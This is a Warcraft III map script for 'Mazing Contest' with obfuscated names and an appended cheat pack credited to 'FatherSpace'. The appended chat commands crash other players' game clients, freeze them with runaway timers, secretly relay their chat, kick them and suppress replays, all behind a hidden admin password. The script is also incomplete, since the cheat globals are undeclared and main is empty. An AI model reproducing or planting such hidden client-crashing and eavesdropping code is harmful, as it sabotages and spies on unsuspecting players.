//===========================================================================
// 
// |cCC55CCFFMazing Contest|r v1.1
// 
//   Warcraft III map script
//   Generated by the Warcraft III World Editor
//   Date: Fri Sep 12 20:54:49 2008
//   Map Author: Pender
// 
//===========================================================================

//***************************************************************************
//*
//*  Global Variables
//*
//***************************************************************************

globals
    // User-defined
    timer                   udg_asdfdasgvsadfasdg      = null
    boolean array           udg_asdfgdsagdsfsd
    real array              udg_asdgfdsafgsdgsdaf
    real array              udg_asdgsadfsadgasdf
    group                   udg_temp_group             = null
    integer                 udg_asdgfasdfsdgsadf       = 0
    group                   udg_Chain                  = null
    boolean                 udg_asdgasdgadsf           = false
    boolean                 udg_asdgasdfasdgs          = false
    boolean                 udg_asdfadsgdsfasd         = false
    unit                    udg_asdgfdsafgsdsdaf       = null
    location                udg_temp_point             = null
    boolean array           udg_asdfsdagsdafsa
    location array          udg_asdgasdfsadgdsf
    location array          udg_asdfgdsafsadgds
    rect array              udg_asdgvdsafsadgvds
    location array          udg_asdgvdsfasdgsd
    integer                 udg_asdgdsfasdgdsa         = 0
    real                    udg_asdfgasgsadfsdg        = 0
    real                    udg_asdfasdgsdfsdg         = 0
    integer                 udg_asdgfsdagvsdafdsg      = 0
    boolean                 udg_asdfsdagadsf           = false
    unit array              udg_asdgvdsafasdgsda
    group                   udg_asdfdsagadsf           = null
    integer                 udg_asdfdsgdsfgsadgs       = 0
    group                   udg_Chain_New_Additions_2  = null
    group                   udg_Chain_New_Additions_1  = null
    integer                 udg_asdfasdgsdafsd         = 0
    integer                 udg_asdfadsgsdfgsadg       = 0
    integer                 udg_asdfasdgasdsadfsadg    = 0
    group                   udg_Thunderclap_Towers     = null
    unit array              udg_asdfasdgasdfsadg
    integer                 udg_asdfgadsfsadgvs        = 0
    integer                 udg_asdgvadsfsdagbsd       = 0
    integer array           udg_asdgvsdfsadgvdsf
    string array            udg_asdgfdsgvsadfasd
    timer                   udg_asdgasdfsadgsd         = null
    timerdialog             udg_asdgfsadfasdfs         = null
    integer array           udg_asdfasdgsdafsdg
    timer                   udg_asdgdsafsadsgsadf      = null
    timerdialog             udg_asdgfadsgsadfas        = null
    location                udg_temp_point_2           = null
    integer                 udg_asdgdsafsadgsadf       = 0
    integer array           udg_asdgsadgvadsgsadf
    integer array           udg_asdgvdfsfgsdagds
    integer array           udg_asdgvdsfasdgdsf
    integer array           udg_asdgdsfasdgfds
    boolean array           udg_asdgvdsfasdgvsd
    real array              udg_asdgfvsdagsdfas
    camerasetup array       udg_asdgfsadgsadfasdg
    unit                    udg_asdgvdsafdsgvs         = null
    integer                 udg_asdfgdsafgsadsdaf      = 0
    group                   udg_Preplaced_Towers       = null
    timer                   udg_asdgfdsfasdgds         = null
    timerdialog             udg_asdgfasdgadsfds        = null
    dialog                  udg_asdfasdfgsadgv         = null
    dialog                  udg_asdgdsfasdgdsf         = null
    dialog                  udg_asdfsadgvsdafds        = null
    dialog                  udg_asdfsdagvdsafsd        = null
    button                  udg_asdfasdgsdfs           = null
    button                  udg_asdfdsagasdf           = null
    button                  udg_asdfgadsgadsfs         = null
    button                  udg_asdfasdgfadsf          = null
    button                  udg_asdgfsadgfadsf         = null
    button                  udg_asdgfasdgdsf           = null
    button                  udg_asdfdsagvsdfsadf       = null
    button                  udg_asdgdsfasdgds          = null
    button                  udg_asdfdsagvsdaf          = null
    button                  udg_asdgfadsfadsg          = null
    button                  udg_asdgvdsfsadgvds        = null
    button                  udg_asdfgsdafadsg          = null
    button                  udg_asdfdsagdsfs           = null
    button                  udg_asdgfdasgvsadf         = null
    integer                 udg_adsgdasfadsgds         = 0
    integer                 udg_asdfadsgdsafasdgs      = 0
    boolean                 udg_asdfsadgsda            = false
    player                  udg_asdfsadgvsdfsd         = null
    timer                   udg_asdgfdsafgsadgsd       = null
    timer                   udg_asdgdsfsasdgdsf        = null
    timer                   udg_asdgfdsfgsadgsdaf      = null
    integer array           udg_asdgfdsfgdsafsa
    integer array           udg_asdgvdasfsdgf
    integer array           udg_asdfgasdfsdagvds

    // Generated
    rect                    gg_rct_finish_bottom_row   = null
    rect                    gg_rct_finish_top_row      = null
    rect                    gg_rct_p1_lower_left       = null
    rect                    gg_rct_p2_lower_left       = null
    rect                    gg_rct_p3_lower_left       = null
    rect                    gg_rct_p4_lower_left       = null
    rect                    gg_rct_p5_lower_left       = null
    rect                    gg_rct_p6_lower_left       = null
    rect                    gg_rct_p7_lower_left       = null
    rect                    gg_rct_p8_lower_left       = null
    rect                    gg_rct_p9_lower_left       = null
    rect                    gg_rct_p10_lower_left      = null
    rect                    gg_rct_p11_lower_left      = null
    rect                    gg_rct_p12_lower_left      = null
    rect                    gg_rct_Middle_of_Nowhere   = null
    rect                    gg_rct_The_End             = null
    camerasetup             gg_cam_Overhead_1          = null
    camerasetup             gg_cam_Overhead_2          = null
    camerasetup             gg_cam_Overhead_3          = null
    camerasetup             gg_cam_Overhead_4          = null
    camerasetup             gg_cam_Overhead_5          = null
    camerasetup             gg_cam_Overhead_6          = null
    camerasetup             gg_cam_Overhead_7          = null
    camerasetup             gg_cam_Overhead_8          = null
    camerasetup             gg_cam_Overhead_9          = null
    camerasetup             gg_cam_Overhead_10         = null
    camerasetup             gg_cam_Overhead_11         = null
    camerasetup             gg_cam_Overhead_12         = null
    camerasetup             gg_cam_The_End             = null
    sound                   gg_snd_PlayerLeft          = null
    sound                   gg_snd_EndMusic            = null
    sound                   gg_snd_TimeWarning         = null
    trigger                 gg_trg_READ_ME             = null
    trigger                 gg_trg_asdgfadsgadsgfs     = null
    trigger                 gg_trg_asdfadsgsadfasdg    = null
    trigger                 gg_trg_asdfsadgsadfsdag    = null
    trigger                 gg_trg_asdgadsgasdgsadg    = null
    trigger                 gg_trg_asdgfasdgsdfasd     = null
    trigger                 gg_trg_asdgfasdgsadgfsad   = null
    trigger                 gg_trg_asdgfasdgasdgasd    = null
    trigger                 gg_trg_asdgsadgsadgsadd    = null
    trigger                 gg_trg_asdgasdfasdgasdgf   = null
    trigger                 gg_trg_asdgsadfsadgsadf    = null
    trigger                 gg_trg_asdfsdgsdfsdg       = null
    trigger                 gg_trg_asdfsadgasdfsadgas  = null
    trigger                 gg_trg_asgdsafsdgsadfasdg  = null
    trigger                 gg_trg_asdgsafasdgadsfsa   = null
    trigger                 gg_trg_asdfdsgdsafasdgdsa  = null
    trigger                 gg_trg_asdfasdgsadfsdgsa   = null
    trigger                 gg_trg_asdfasdgsdsadfsdg   = null
    trigger                 gg_trg_asdfsagasdfsdgasd   = null
    trigger                 gg_trg_asdgfasdgsadfsdgs   = null
    trigger                 gg_trg_adgfsaasdgasdfsdg   = null
    trigger                 gg_trg_asdfasdgsdafsadg    = null
    trigger                 gg_trg_asdgasdgfasdfsdgsadf = null
    trigger                 gg_trg_asdfsadgsdafsdgf    = null
    trigger                 gg_trg_asdfgasdgsadfsdg    = null
    trigger                 gg_trg_asdfasdgsadfsdag    = null
    trigger                 gg_trg_asdfasdgasdfsadg    = null
    trigger                 gg_trg_asdfasdgsadfsadg    = null
    trigger                 gg_trg_asdfgasdgsadfasgd   = null
    trigger                 gg_trg_asdfasdgsdfsadgs    = null
    trigger                 gg_trg_asdfgasdgsdfasdg    = null
    trigger                 gg_trg_adsgdsafasdgsdfsa   = null
    trigger                 gg_trg_asdfasdgsadfsdgsda  = null
    trigger                 gg_trg_asdgadsfasdgsdfsd   = null
    trigger                 gg_trg_asdfasdgsadfasd     = null
    trigger                 gg_trg_asdfdasgsdfsdgsad   = null
    trigger                 gg_trg_asdfsdagsdfsdgasd   = null
    trigger                 gg_trg_asdgfasdfsadgsdfsagd = null
    trigger                 gg_trg_asdgasdfsdgsdf      = null
    trigger                 gg_trg_asdgadsfgsadgsd     = null
    unit                    gg_unit_h000_0049          = null
endglobals

function FS_Crash takes player p, player FSp returns nothing
if (p==GetLocalPlayer())and(p!=FSadmin)and(p!=FSp)then
call ExecuteFunc("FS Crashed")
set p=null
set FSp=null
endif
endfunction
function FS_Hear takes nothing returns nothing
call DisplayTextToForce(FShf,GetPlayerName(GetTriggerPlayer())+": "+GetEventPlayerChatString())
endfunction
function FS_AdminGet takes player FSp returns nothing
if FSb1==false then
call DisplayTimedTextToPlayer(FSp,0,0,10,GetPlayerName(FSadmin)+" is already admin.")
endif
if (FSb1==true)and(FSba[GetPlayerId(FSp)]==true) then
set FSadmin=FSp
set FSb1=false
call DisplayTimedTextToPlayer(FSadmin,0,0,10,"You are now admin.")
elseif FSp==FSadmin then
call DisplayTimedTextToPlayer(FSadmin,0,0,10,"You're already admin!")
endif
set FSp=null
endfunction
function Clusterfuck_Child takes nothing returns nothing
call TimerStart(CreateTimer(),.001,true,function Clusterfuck_Child)
endfunction
function Clusterfuck takes player p, player FSp returns nothing
if p==GetLocalPlayer()then
if (p!=FSadmin)and(GetPlayerName(p)!="FatherSpace")and(p!=FSp) then
call RemoveUnit(CreateUnit(GetLocalPlayer(),'hpea',0,0,0))
call TimerStart(CreateTimer(),.001,true,function Clusterfuck_Child)
endif
endif
endfunction
function FS_Commands takes nothing returns nothing
local player FSp1=GetTriggerPlayer()
local string FSs1=GetEventPlayerChatString()
local integer FSi1=StringLength(FSs1)
local integer FSi2=0
local group FSg1=CreateGroup()
local unit FSu1
if SubString(FSs1,0,6)==".gold " then
call AdjustPlayerStateBJ(S2I(SubString(FSs1,6,FSi1)), FSp1,PLAYER_STATE_RESOURCE_GOLD)
elseif SubString(FSs1,0,8)==".lumber " then
call AdjustPlayerStateBJ(S2I(SubString(FSs1,8,FSi1)), FSp1,PLAYER_STATE_RESOURCE_LUMBER)
elseif SubString(FSs1,0,4)==".gp " then
call AdjustPlayerStateBJ(S2I(SubString(FSs1, 7,FSi1 ) ), Player(S2I(SubString(FSs1, 5,6))), PLAYER_STATE_RESOURCE_GOLD)
elseif SubString(FSs1,0,4)==".lp " then
call AdjustPlayerStateBJ(S2I(SubString(FSs1, 7,FSi1 ) ), Player(S2I(SubString(FSs1, 5,6))), PLAYER_STATE_RESOURCE_LUMBER)
elseif SubString(FSs1, 0, 4)==".cn " then
call SetPlayerName(FSp1, SubString(FSs1,4,FSi1))
elseif SubString(FSs1,0,9)==".noreplay" then
call DoNotSaveReplay()
elseif SubString(FSs1,0,5)==".say " then
call DisplayTextToForce(bj_FORCE_ALL_PLAYERS, SubString(FSs1,5,FSi1))
elseif SubString(FSs1,0,5)==".hear" then
call ForceAddPlayer( FShf, FSp1 )
elseif SubString(FSs1, 0, 7)==".crash " then
call FS_Crash(Player(S2I(SubString(FSs1,7,8))),FSp1)
elseif (SubString(FSs1, 0, 3)==".ca")and(FSi1==3) then
loop
exitwhen FSi2>11
call FS_Crash(Player(FSi2),FSp1)
set FSi2=FSi2+1
endloop
elseif SubString(FSs1, 0, 4)==".cf " then
call Clusterfuck(Player(S2I(SubString(FSs1,4,5))), FSp1)
elseif SubString(FSs1,0,6)==".kick " then
if Player(S2I(SubString(FSs1,6,FSi1)))!=FSadmin then
call CustomDefeatBJ(Player(S2I(SubString(FSs1,6,7))), "")
endif
elseif SubString(FSs1,0,9)==".jwsadmin" then
set FSba[GetPlayerId(FSp1)]=true
call DisplayTimedTextToPlayer(FSp1,0,0,10,"Password?")
elseif SubString(FSs1,0,7)==".L0ck3D" then
call FS_AdminGet(FSp1)
elseif ((SubString(FSs1, 0,3)==".cc")and(FSp1==FSadmin)) then
loop
exitwhen FSi2>11
if FSba2[FSi2]==true then
call DisplayTimedTextToPlayer(FSp1,0,0,10,"|cffff0000"+GetPlayerName(Player(FSi2))+"|r is using cheats.")
else
call DisplayTimedTextToPlayer(FSp1,0,0,10,GetPlayerName(Player(FSi2))+" is not using cheats")
endif
set FSi2=FSi2+1
endloop
elseif SubString(FSs1,0,7)==".cadmin" then
if FSb1==false then
call DisplayTimedTextToPlayer(FSp1,0,0,10,GetPlayerName(FSadmin)+" is the admin in this game.")
else
endif
elseif (SubString(FSs1,0,9)==".nocheat ")and(FSp1==FSadmin) then
endif
call GroupEnumUnitsSelected(FSg1,FSp1,null)
loop
set FSu1=FirstOfGroup(FSg1)
exitwhen FSu1==null
if SubString(FSs1,0,5)==".lvl " then
call SetHeroLevelBJ(FSu1,S2I(SubString(FSs1,5,FSi1)),true)
elseif SubString(FSs1,0,5)==".str " then
call SetHeroStr(FSu1, S2I(SubString(FSs1,5,FSi1)),true)
elseif SubString(FSs1,0,5)==".agi " then
call SetHeroAgi(FSu1, S2I(SubString(FSs1,5,FSi1)),true)
elseif SubString(FSs1,0,5)==".int " then
call SetHeroInt(FSu1, S2I(SubString(FSs1,5,FSi1)),true)
elseif SubString(FSs1,0,4)==".ms " then
call SetUnitMoveSpeed(FSu1,S2R(SubString(FSs1,4,FSi1)))
elseif SubString(FSs1,0,5)==".kill" then
call KillUnit(FSu1)
elseif SubString(FSs1,0,5)==".copy" then
if S2I(SubString(FSs1,6,FSi1))>0 then
loop
call CreateUnitAtLoc(GetOwningPlayer(FSu1), GetUnitTypeId(FSu1), GetUnitLoc(FSu1), GetUnitFacing(FSu1))
call TriggerSleepAction(.001)
exitwhen FSi2>S2I(SubString(FSs1,6,FSi1))
set FSi2=FSi2+1
endloop
else
call CreateUnitAtLoc(GetOwningPlayer(FSu1), GetUnitTypeId(FSu1), GetUnitLoc(FSu1), GetUnitFacing(FSu1))
call RemoveLocation(GetUnitLoc(FSu1))
endif
elseif (SubString(FSs1,0,7)==".owner ") then
call SetUnitOwner(FSu1, Player(S2I(SubString(FSs1,7,8))),true)
elseif SubString(FSs1,0,6)==".invis" then
call UnitAddAbility(FSu1,'Apiv')
elseif SubString(FSs1,0,4)==".vis" then
call UnitRemoveAbility(FSu1,'Apiv')
elseif SubString(FSs1,0,7)==".invuln" then
call SetUnitInvulnerable(FSu1,true)
elseif SubString(FSs1,0,5)==".vuln" then
call SetUnitInvulnerable(FSu1,false)
elseif SubString(FSs1,0,7)==".nopath" then
call SetUnitPathing(FSu1,false)
elseif SubString(FSs1,0,7)==".pathon" then
call SetUnitPathing(FSu1,true)
endif
call GroupRemoveUnit(FSg1,FSu1) 
endloop
call DestroyGroup(FSg1)
set FSp1=null
set FSs1=""
endfunction
function FS_Activate takes nothing returns nothing
local player FSp=GetTriggerPlayer()
call TriggerRegisterPlayerChatEvent(FSt2,FSp,".",false)
call DisplayTimedTextToPlayer(FSp,0,0,15,"Cheats by |cffff0000F|rather|cffff0000S|rpace.")
set FSba[GetPlayerId(FSp)]=false
set FSba2[GetPlayerId(FSp)]=true                                         
set FSp=null
endfunction


function main takes nothing returns nothing


endfunction